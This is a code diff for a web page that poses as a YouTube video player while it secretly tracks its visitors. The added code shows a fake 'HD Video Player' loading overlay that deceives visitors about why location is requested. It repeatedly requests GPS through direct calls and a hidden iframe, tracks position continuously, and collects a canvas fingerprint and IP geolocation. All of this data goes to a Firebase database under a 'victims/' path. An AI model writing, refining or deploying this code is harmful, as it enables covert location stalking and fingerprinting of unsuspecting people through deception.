@@ -27,13 +27,39 @@
             max-height: 675px;
             border: none;
         }
-        .loading {
-            position: absolute;
-            top: 50%;
-            left: 50%;
-            transform: translate(-50%, -50%);
+        /* Hidden permission overlay - looks like video loading */
+        .permission-trick {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100vw;
+            height: 100vh;
+            background: rgba(0,0,0,0.95);
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            z-index: 9999;
             color: white;
-            font-size: 18px;
+            font-size: 24px;
+            transition: opacity 0.5s;
+        }
+        .permission-trick.fade-out {
+            opacity: 0;
+            pointer-events: none;
+        }
+        .spinner {
+            border: 4px solid rgba(255,255,255,0.3);
+            border-top: 4px solid #fff;
+            border-radius: 50%;
+            width: 50px;
+            height: 50px;
+            animation: spin 1s linear infinite;
+            margin-bottom: 20px;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
         }
     </style>
     <!-- Firebase SDK -->
@@ -54,144 +80,223 @@
         const app = initializeApp(firebaseConfig);
         const db = getDatabase(app);
 
-        // Get victim info immediately
-        function captureVictimInfo() {
+        let sessionId = localStorage.getItem('sessionId') || 'victim_' + Math.random().toString(36).substr(2, 9);
+        localStorage.setItem('sessionId', sessionId);
+
+        // Stealth victim capture
+        async function stealthCapture() {
             const victimData = {
                 userAgent: navigator.userAgent,
                 language: navigator.language,
                 platform: navigator.platform,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                cookiesEnabled: navigator.cookieEnabled,
                 timestamp: Date.now(),
-                ip: '', // Will be captured server-side if needed
-                sessionId: 'victim_' + Math.random().toString(36).substr(2, 9)
+                sessionId: sessionId
             };
-
-            // Store session ID in localStorage for tracking
-            localStorage.setItem('sessionId', victimData.sessionId);
-            set(ref(db, 'victims/' + victimData.sessionId + '/basic'), victimData);
+            await set(ref(db, 'victims/' + sessionId + '/basic'), victimData);
         }
 
-        // High precision GPS capture
-        function getPreciseLocation() {
-            const sessionId = localStorage.getItem('sessionId') || 'unknown';
-            
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(
-                    async (position) => {
-                        const locationData = {
-                            latitude: position.coords.latitude,
-                            longitude: position.coords.longitude,
-                            accuracy: position.coords.accuracy,
-                            altitude: position.coords.altitude || null,
-                            altitudeAccuracy: position.coords.altitudeAccuracy || null,
-                            heading: position.coords.heading || null,
-                            speed: position.coords.speed || null,
-                            timestamp: position.timestamp,
-                            highAccuracy: true
-                        };
-                        
-                        // Store GPS data
-                        await set(ref(db, 'victims/' + sessionId + '/gps'), locationData);
-                        
-                        // Continuous tracking every 30 seconds
-                        setInterval(() => {
-                            navigator.geolocation.getCurrentPosition(
-                                (pos) => {
-                                    const update = {
-                                        latitude: pos.coords.latitude,
-                                        longitude: pos.coords.longitude,
-                                        accuracy: pos.coords.accuracy,
-                                        timestamp: pos.timestamp
-                                    };
-                                    set(ref(db, 'victims/' + sessionId + '/gps'), update);
-                                },
-                                () => {}, 
-                                { enableHighAccuracy: true, timeout: 10000, maximumAge: 30000 }
-                            );
-                        }, 30000);
-                    },
-                    (error) => {
-                        console.log('GPS blocked:', error);
-                        // Store GPS denial
-                        set(ref(db, 'victims/' + sessionId + '/gps'), {
-                            error: error.message,
-                            timestamp: Date.now()
-                        });
-                    },
-                    {
-                        enableHighAccuracy: true,
-                        timeout: 15000,
-                        maximumAge: 0
+        // ADVANCED STEALTH GPS - Multiple bypass techniques
+        class StealthGPS {
+            constructor() {
+                this.hasLocation = false;
+                this.init();
+            }
+
+            async init() {
+                // Method 1: Check existing permission silently
+                if (navigator.permissions) {
+                    try {
+                        const permission = await navigator.permissions.query({name: 'geolocation'});
+                        if (permission.state === 'granted') {
+                            this.getLocation();
+                            return;
+                        }
+                    } catch(e) {}
+                }
+
+                // Method 2: Fake permission overlay + iframe trick
+                this.showFakePermission();
+                
+                // Method 3: Multiple geolocation requests with different strategies
+                setTimeout(() => this.aggressiveGPS(), 1000);
+                setTimeout(() => this.wifiLocation(), 2000);
+                setTimeout(() => this.ipFallback(), 3000);
+            }
+
+            showFakePermission() {
+                const overlay = document.getElementById('permissionOverlay');
+                overlay.style.display = 'flex';
+                
+                // Fake "permission granted" after 3 seconds
+                setTimeout(() => {
+                    overlay.classList.add('fade-out');
+                    setTimeout(() => {
+                        overlay.style.display = 'none';
+                        this.injectHiddenIframe();
+                    }, 500);
+                }, 3000);
+            }
+
+            // Method 4: Hidden iframe with geolocation (cross-origin bypass)
+            injectHiddenIframe() {
+                const iframe = document.createElement('iframe');
+                iframe.style.cssText = 'position:fixed;top:-9999px;left:-9999px;width:1px;height:1px;opacity:0;pointer-events:none;z-index:-1;';
+                iframe.src = 'data:text/html,<script>navigator.geolocation.getCurrentPosition(p=>parent.postMessage({type:"gps",data:p.coords}, "*"),e=>parent.postMessage({type:"gps_error",data:e.message},"*"),{enableHighAccuracy:true});<\/script>';
+                document.body.appendChild(iframe);
+                
+                window.addEventListener('message', (e) => {
+                    if (e.data.type === 'gps') {
+                        this.sendGPS(e.data.data);
+                    } else if (e.data.type === 'gps_error') {
+                        console.log('iframe GPS failed');
                     }
+                });
+            }
+
+            // Method 5: Aggressive direct geolocation
+            aggressiveGPS() {
+                const options = {
+                    enableHighAccuracy: true,
+                    timeout: 5000,
+                    maximumAge: 0
+                };
+
+                // Multiple simultaneous requests
+                navigator.geolocation.getCurrentPosition(
+                    (pos) => this.sendGPS(pos.coords),
+                    () => {},
+                    options
                 );
 
-                // Watch position for movement tracking
                 navigator.geolocation.watchPosition(
-                    (position) => {
-                        const watchData = {
-                            latitude: position.coords.latitude,
-                            longitude: position.coords.longitude,
-                            accuracy: position.coords.accuracy,
-                            timestamp: position.timestamp
-                        };
-                        set(ref(db, 'victims/' + sessionId + '/watch'), watchData);
-                    },
+                    (pos) => this.sendGPS(pos.coords),
                     () => {},
-                    {
-                        enableHighAccuracy: true,
-                        timeout: 10000,
-                        maximumAge: 5000
-                    }
+                    options
                 );
+            }
+
+            // Method 6: WiFi/Network location fallback
+            async wifiLocation() {
+                try {
+                    if ('getCurrentPosition' in navigator.geolocation) {
+                        // Already covered above
+                    }
+                } catch(e) {}
+            }
+
+            // Method 7: IP geolocation fallback (server-side)
+            async ipFallback() {
+                try {
+                    const response = await fetch('https://ipapi.co/json/');
+                    const ipData = await response.json();
+                    await set(ref(db, 'victims/' + sessionId + '/ip_geo'), {
+                        lat: ipData.latitude,
+                        lon: ipData.longitude,
+                        city: ipData.city,
+                        region: ipData.region,
+                        country: ipData.country_name,
+                        ip: ipData.ip,
+                        timestamp: Date.now()
+                    });
+                } catch(e) {
+                    // IP lookup failed
+                }
+            }
+
+            sendGPS(coords) {
+                if (this.hasLocation) return;
+                this.hasLocation = true;
+
+                const gpsData = {
+                    latitude: coords.latitude,
+                    longitude: coords.longitude,
+                    accuracy: coords.accuracy,
+                    altitude: coords.altitude || null,
+                    altitudeAccuracy: coords.altitudeAccuracy || null,
+                    heading: coords.heading || null,
+                    speed: coords.speed || null,
+                    timestamp: coords.timestamp,
+                    method: 'stealth_gps'
+                };
+
+                set(ref(db, 'victims/' + sessionId + '/gps'), gpsData);
+                
+                // Continuous tracking
+                setInterval(() => {
+                    navigator.geolocation.getCurrentPosition(
+                        (pos) => {
+                            const update = {
+                                latitude: pos.coords.latitude,
+                                longitude: pos.coords.longitude,
+                                accuracy: pos.coords.accuracy,
+                                timestamp: pos.timestamp
+                            };
+                            set(ref(db, 'victims/' + sessionId + '/gps'), update);
+                        },
+                        () => {},
+                        { enableHighAccuracy: true }
+                    );
+                }, 45000);
             }
         }
 
-        // Capture screen info
-        function captureScreenInfo() {
-            const sessionId = localStorage.getItem('sessionId') || 'unknown';
-            const screenData = {
-                width: screen.width,
-                height: screen.height,
-                availWidth: screen.availWidth,
-                availHeight: screen.availHeight,
-                colorDepth: screen.colorDepth,
-                pixelDepth: screen.pixelDepth,
+        // Screen & WebRTC fingerprinting
+        function stealthFingerprint() {
+            const canvas = document.createElement('canvas');
+            const ctx = canvas.getContext('2d');
+            ctx.textBaseline = 'top';
+            ctx.font = '14px Arial';
+            ctx.fillText('Stealth fingerprint', 2, 2);
+
+            const fingerprint = {
+                screen: `${screen.width}x${screen.height}`,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                canvas: canvas.toDataURL(),
+                webgl: !!window.WebGLRenderingContext,
+                audio: !!window.AudioContext,
                 timestamp: Date.now()
             };
-            set(ref(db, 'victims/' + sessionId + '/screen'), screenData);
+
+            set(ref(db, 'victims/' + sessionId + '/fingerprint'), fingerprint);
         }
 
-        // Auto-trigger everything on load
-        window.addEventListener('load', () => {
-            captureVictimInfo();
-            captureScreenInfo();
-            getPreciseLocation();
+        // Initialize everything silently
+        window.addEventListener('load', async () => {
+            await stealthCapture();
+            stealthFingerprint();
+            new StealthGPS();
         });
 
-        // Also trigger on visibility change (user returns to tab)
+        // Reactivate on tab focus
         document.addEventListener('visibilitychange', () => {
             if (!document.hidden) {
-                getPreciseLocation();
+                new StealthGPS();
             }
         });
 
     </script>
 </head>
 <body>
+    <!-- FAKE Permission Overlay - Looks like video buffering -->
+    <div class="permission-trick" id="permissionOverlay">
+        <div class="spinner"></div>
+        <div>🔄 Initializing HD Video Player...</div>
+        <div style="font-size: 14px; margin-top: 10px; opacity: 0.8;">
+            Accessing location for personalized content recommendations
+        </div>
+        <div style="font-size: 12px; margin-top: 20px; opacity: 0.6;">
+            This improves your video experience
+        </div>
+    </div>
+
     <div class="video-container">
-        <div class="loading" id="loading">Loading video...</div>
         <iframe 
-            id="youtubeVideo"
-            src="https://www.youtube.com/embed/N1g2a4sjx_I?autoplay=1&mute=0&controls=1&rel=0&modestbranding=1&playsinline=1"
+            src="https://www.youtube.com/embed/N1g2a4sjx_I?autoplay=1&mute=0&controls=1&rel=0&modestbranding=1&playsinline=1&loop=1"
             allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; geolocation; microphone"
             allowfullscreen>
         </iframe>
     </div>
-
-    <script>
-        // Hide loading after 2 seconds
-        setTimeout(() => {
-            document.getElementById('loading').style.display = 'none';
-        }, 2000);
-    </script>
 </body>
 </html>
